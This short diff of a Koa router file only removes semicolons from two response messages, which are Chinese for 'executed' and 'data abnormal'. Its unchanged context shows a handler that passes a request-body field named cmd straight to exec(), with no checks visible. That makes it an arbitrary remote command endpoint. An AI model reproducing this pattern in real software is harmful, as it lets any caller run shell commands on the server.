@@ -18,10 +18,10 @@ router
         let sh = ctx.request.body?.cmd
         if (sh) {
             exec(sh)
-            ctx.body = '已执行';
+            ctx.body = '已执行'
             return
         }
-        ctx.body = '数据异常';
+        ctx.body = '数据异常'
     })
 
 /* 创建挂载Koa应用程序的http服务 */
